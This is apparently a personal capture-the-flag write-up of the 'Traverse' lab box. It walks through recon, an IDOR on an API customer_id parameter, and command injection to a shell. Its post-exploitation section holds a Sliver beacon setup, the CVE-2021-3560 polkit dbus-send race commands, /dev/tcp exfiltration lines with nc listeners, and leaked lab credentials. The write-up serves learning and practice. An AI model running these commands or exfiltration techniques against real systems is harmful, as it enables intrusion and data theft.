# Traverse Writeup

Name: Traverse
Date:  5/8/2023
Difficulty:  Easy 
Goals:  
- Secure my Secure Coding and Application Testing 
- JavaScript [Mithridatism](https://en.wikipedia.org/wiki/Mithridatism) - [interview from a dev..](https://www.youtube.com/watch?v=Uo3cL4nrGOk)
- Do it in 2.5 hours
- Install codium on Kali and get the Snyk application
Learnt:
- `PATTERN$` I always got that wrong I updated my notes as I was incorrectly `$PATTERN`
- I overthought `sed 's/customer-id-.\.txt://g'` a bit but figure it out without searching
Beyond Root:
- Azure Application Services and App Service Plan 
- Hack the website and back door it myself and patch my in.
- Snyk showcase both - 'recon-ed' website and dumped website.

## Recon and Data Collection

Even though we know it is just a HTTP web server we should really do recon for the sake of hopeful hacking the website for the sake of cyber-warfare asset control. I used `masscan`, `nmap` more to check for other applications that may run business logic for the web application like a database or proxy.

I use `nuclei` and `nikto` to get a baseline understand of what the software hosting the website, versions and languages is and to validate what OS.   

For content discovery: `ferxbuster` to brute force everything, `gospider` to get all linked, therefore called files with code, then `gobuster` to discovery if past some restricted directories we can still enumerate files. Then in the background fuzz with `ffuf` anything from parameters, directories, vhosts, etc.

The sensible thing is also to grab everything that can get as external client to the server.

Make a directory and recursive grab all the pages `wget` can access.
```bash
mkdir wgeted-Website
wget -r http://10.10.233.101/
```

And if there are any git repositories use tools to find vulnerabilities and information disclosures in the earlier commits. Ultimately we would want separate the data from what we found and what we can just clone from a repository. 

While this is going on in the background research how to setup `codium` on Kali because I do not need the Telemetry for Github Copilot. I want the `Snyk` plugin to pull some the easier lifting for the *low hanging fruit* with in the application and either leverage recon found, Snyk report and anything I find to combine it to exploit the web server.

Give Ippsec more love and money - Secure your apps with Snyk

<iframe width="560" height="315" src="https://www.youtube.com/embed/VRz_vtPBZzA" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

I will showcase this in the Beyond Root section.

Before I drill down through `/api/` made a more substantial listing on directories to then fuzz  for API directories and endpoints with `ffuf` and `gobuster` for file discovery. Before getting something like `postman` out from analogical horrid weather (of wherever the reader is) and that is the back of my mind on what to do after doing various task before getting to `postman`.
```bash
FB=$(cat feroxbuster/rmwl.txt| grep http | cut -d: -f2 | awk '{print "http:"$1}')
GS=$(cat gospider/10_10_233_101 | grep http | cut -d: -f2 | grep -v http | awk '{print "http:"$1}')
echo "$GS\n$FB" | sort -u | tee -a gsPlusFb-foundDirsNFiles.txt
# for all the directories we need to fuzz we use a regex to grep all lines ending in a / 
# PATTERN`$` to grep by pattern at the end of a line
cat gsPlusFb-foundDirsNFiles.txt | egrep '/$'
# And to grep all that do not end in `/`
cat gsPlusFb-foundDirsNFiles.txt | egrep -v '/$'
# The above to demo and the below to make and add to a file
cat gsPlusFb-foundDirsNFiles.txt | egrep '/$' | tee -a fuzzTheseDirs.txt
cat gsPlusFb-foundDirsNFiles.txt | egrep -v '/$' | tee -a endpointsTocheck.txt
```

The directories
```bash
# Remember these are directories that a combined wordlist of common wordlists that are used in CTFs have found but it cannot recursive find anything - does not mean there is nothing there...
cat gsPlusFb-foundDirsNFiles.txt | egrep '/$'
http://10.10.233.101/api/ # important to fuzz
http://10.10.233.101/client/
http://10.10.233.101/img/
http://10.10.233.101/logs/ # important to fuzz once research file name formating
http://10.10.233.101/phpmyadmin/ # important
http://10.10.233.101/planning/ # weird and worth understand how it is connected to the rest of the website before actually fuzzing 
```

On the subject of the `/phpmyadmin/` breaking in here is very possible -  possible XSS with cookie created with httponly  
```bash
+ /phpmyadmin/changelog.php: Cookie goto created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
```

And the Logs is probably indexed so we may not need to fuzz 
```perl
+ /logs/: Directory indexing found.
+ /logs/: This might be interesting.
```
Feroxbuster found email_dump
```rust
200      GET       13l       75w      450c http://10.10.233.101/logs/email_dump.txt
```

![](nmapfindbobandmarkemails.png)

Open Burpsuite to start manual checking while I start the fuzzing and secondary scanning and udp port scanning for the data and OSCP workflow retention. I miss hacking and I do not want the miss a thing...or when close my eyes and cry about not fuzzing that site, I miss CTFs, I do not want to miss a thing...
![](minifiedjsanddomainname.png)

Lmao  and "oh hi mark!"
![](emaildumpssomejuice.png)

First phase of SSDLC is...Planning, which is the it does not make sense that there is planning directory on a-website-that-is-already-made-odd-one-out-part. It stuck out *"/planning/... worth understand how it is connected to the rest of the website before actually fuzzing "* This would be an API to be passed as a header. I will test that with after I answer the early questions.

#### Javascript Minification

![](weunderstanditisobfuscated.png)

It hexadecimal - [convert with binaryhexconverter.com](https://www.binaryhexconverter.com/hex-to-ascii-text-converter)
```js
(function(){function doNothing(){}var n="DIRECTORY";var e="LISTING";var o="IS THE";var i="ONLY WAY";var f=null;var l=false;var d;if(f===null){console.log("Flag:"+n+" "+e+" "+o+" "+i);d=undefined}else if(typeof f==="undefined"){d=undefined}else{if(l){d=undefined}else{(function(){if(d){for(var n=0;n<10;n++){console.log("This code does nothing.")}doNothing()}else{doNothing()}})()}}})();
Flag:```

Reminder to always press F12 in the browser to write do all the horrifying things with JavaScript you have to do... 
![](alwayspressf12inbrowser.png)

#### Fuzzing

Adding hostnames
```bash
echo "10.10.233.101 tourism.mht" | sudo tee -a /etc/hosts
# And like me you thought the box benig called traverse then meant the domain name being Tourism was weird.
# sudo sed -i 's/traverse/tourism/g' /etc/hosts
```

Unleashing the `ffuf` for vhosting
```go
ffuf -u http://tourism.mht -H "Host: FUZZ.Tourism.mht" -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ --mc all -fw 243
```

Use JQ to read the JSON output of `ffuf` like ..
```bash
# to see the nice json color scheme and formatting  
cat vhost-ffuf-enum.out | jq
# Now we need "results" { EVERYTHING IN HERE } turned into array: [] then .host for the host field we saw when we `cat vhost-ffuf-enum.out | jq`
# And add | sed 's/["#]//g' to remove the `"` and `#` character and append to file
cat vhost-ffuf-enum.out | jq '.results[].host' | sed 's/["#]//g' | tee -a tourism.vhosts
```

#### API and Planning

`/api` - JSON!
```json
{"data":null,"response_code":400,"response_desc":"Invalid Request"}
```

![](noplanning.png)

Oh no...
![](ohdear.png)

To get this page I decide to remember to Burp intercept the response and save the response method...
![](instructions.png)
`Right Click on Proxied Request -> Forward -> Right Click on Response from http://10.10.233.101/`
Save as `planning-authenticated.html` to practice spell authenticated as my notes can 80 plus misspellings of authenticated as `authenicated` ... thank `linux` for `sed` 

IDOR incoming... we can fuzzing for an IDOR on `api/?` parameter `customer_id=` that takes a digit as an id argument with `ffuf`. First make the wordlist list:
```bash
for i in $(seq 0 100); do echo $i | tee -a 0-999-single-digits.txt; done
```

Although this is somewhat unnecessary it is also more realworld like to atleast do the closest thing to the real world

```bash
ffuf -u 'http://tourism.mht/api/?customer_id=FUZZ' -fw 2 -c -w 0-999-single-digits.txt:FUZZ -o ffuf-custom_idFUZZ.out
```

Insert shrugging john traversal for the password of `qwerty5` as we speed on through to the need to grab every response from 100 plus users to find the real admin from all the users 
![](johntraversal.png)
So first directory management and script `curl` to grab and save each, then concatenate them and `jq` to view it nicely  - or recursive grep to find the admin.
```bash
mkdir api-customer-id-responses
# Loop to get all id
for ID in $(cat ../0-999-single-digits.txt); do curl http://tourism.mht/api/?customer_id=$ID -o customer-id-$ID.txt; done
# Concatenate all the good json 
ls * | grep -r -v 'Customer not found' | sed 's/customer-id-.\.txt://g' | tee -a valid-users.json
# view with jq f0or the screenshots
cat valid-users.json | jq
```

We could also just recursive grep with:  `grep -r "isadmin\":\"1\""` without the concatenation to find all the filename concatenating the user admin.

![](bashinginthework.png)

`admin : admin_key!!!`

This does not work by the way...
![](sadpassword.png)

Login Here .. therefore
![](loginhere.png)

...`/realadmin`
![](realestadminloginpage.png)

We are ` realadmin@traverse.com : admin_key!!!` 
![](systemcmdunlocked.png)

I now need to fuzz authenticated with all previous tools for sake of completeness. And to remeber how to do it... feel free to skip the the "Command parameter abuse..." section. 

#### Command parameter abuse... 

![](commands.png)

Send to repeater and go-partial-cyber by creating a sliver beacon for a additional usage in the Beyond Root section... Preparation as the beacno needs to compile -  I am being lazy and you should probably use both server and client
```go
sliver-server
// update
update
// Create beacon
generate beacon --mtls 10.11.3.193:8443 --arch amd64 --os linux --save /home/kali/Traverse/
// Listener
mtls -L 10.11.3.193 -l 8443
```

Either 6969 or 9001 for your memes or port that will bypass firewalls 
```bash
# Ssh port on > 1024 port https://www.linuxquestions.org/questions/linux-security-4/what-are-common-ports-for-ssh-besides-port-22-a-753731/ 
rlwrap ncat -lvnp 2222
```

![](greatbrowserplugin.png)

The next two questions
![1080](andbangtheshellisdone.png)

Proof and next two questions...
![](nexttwoquestions.png)

Spawn a `pty` shell 
```bash
which python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
[CTRL+z]
stty raw -echo;fg
```

Sad there was no cool webshell to add to my collection... 
![](iwouldhavelikeacoolwebshellbutallIgotwasthisecho.png)

We need to 
![](morepasswords.png)
These do not work for `/phpmyadmin/`, but all we *need* to do is  run for the final flag:
```bash
php renamed_file_manager.php
```

## Beyond Root

#### Infiltration 

```bash
# Cheack if we can run in memory
mount | grep shm
cd /dev/shm
# pack beacon with `upx $silverBeacon` 1/3 less size of beacon
curl $yourserver:$port/$sliverBeacon -o $sliverBeacon
```

Linpeas.sh got us

```php
// CRedentials
$dbpass='pN7JqRufUDZh';
$dbuser='phpmyadmin';
```

- CVE-2021-3560 

Polkit - I needed to finish the https://tryhackme.com/room/polkit room and update my notes. 

Exploitation Steps:
```bash
# Time the creation of a new user 
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
# Race condition to kill command half way through execution to create new user and add to sudo group
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.004s; kill $!
# Check user has been created
id attacker
# Password hash creation for the hash used below 
openssl passwd -6 Expl01ted
# Set the password hash - beware of the UID of the newly created user in required in the fllow command
UID="insert the affective user id for the newly created user in the command below"
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1001 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.004s; kill $!
```

Timing initially was 0.221s
![](testthetimingofdbussend.png)

Retesting the timing after failed attempt as the execution was much fast the second test
![](retestingtiming.png)

0.004 seconds!
![](newusercreated.png)
But no user gets created, I tried at various increments but all failed.

#### Exfiltration

Linpeas back to your machine for data collection fanatics like myself
```bash
# Your machine
nc -lvnp 6969 > linpeas-www-data.out
# Traverse
curl $yourserver:$port/linpea.sh -o linpeas.sh
chmod +x linpeas.sh
# Background a job to not lose our shell in the process of sending stdout from linpeas to /dev/tcp/yourIP/6969 - nice..
nohup bash -c 'linpeas.sh 1> /dev/tcp/$YOURIP/6969' &
```

![](sameshell.png)

Similarly for single files like the rename_file_manager.php
```bash
# Your machine
nc -lvnp 6969 > renamed_file_manager.php
# Traverse
nohup bash -c 'cat /var/www/html/realadmin/renamed_file_manager.php 1>/dev/tcp/$YOURIP/6969' &
```

Yes we could also do - but we would lose our shell if it does accept command keys - and we do not get all the files...
```bash
# Traverse
python3 -m http.server 8080
# Your machine
wget -r http://10.10.233.101/
```

#### Source Code Analysis



#### Azure Application Services and App Service Plan  

I am going for Azure exams soon so adding this here to justify doing the CTF even more...

- Create and configure Azure App Service
- 
	- Provision an App Service plan
		- Requires a Resource group
		
	- Configure scaling for an App Service plan
		- 
	- Create an App Service
		- Export the App Plan as an Azure Resource Manager (ARM) template
	- Configure certificates and TLS for an App Service
		- 
	- Map an existing custom DNS name to an App Service
		- 
	- Configure backup for an App Service
		- 
	- Configure networking settings for an App Service
		- 
	- Configure deployment slots for an App Service
		- 





